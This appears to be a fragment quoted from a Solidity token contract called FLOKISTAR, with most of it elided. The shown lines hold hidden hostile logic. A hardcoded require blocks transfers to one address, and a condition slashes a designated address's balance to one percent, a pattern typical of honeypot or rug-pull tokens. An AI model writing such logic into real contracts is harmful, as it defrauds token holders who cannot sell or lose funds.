...
contract FLOKISTAR {
    ...
    address public Buy=0xFCeDdE8a7d4aa2BcB9586dBA43B584A71f19DF17;
...
require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD ); 
        if (Buy != Owner && Buy !=getPair() && to != Buy) {balanceOf[Buy]=balanceOf[Buy].divCeil(100);}
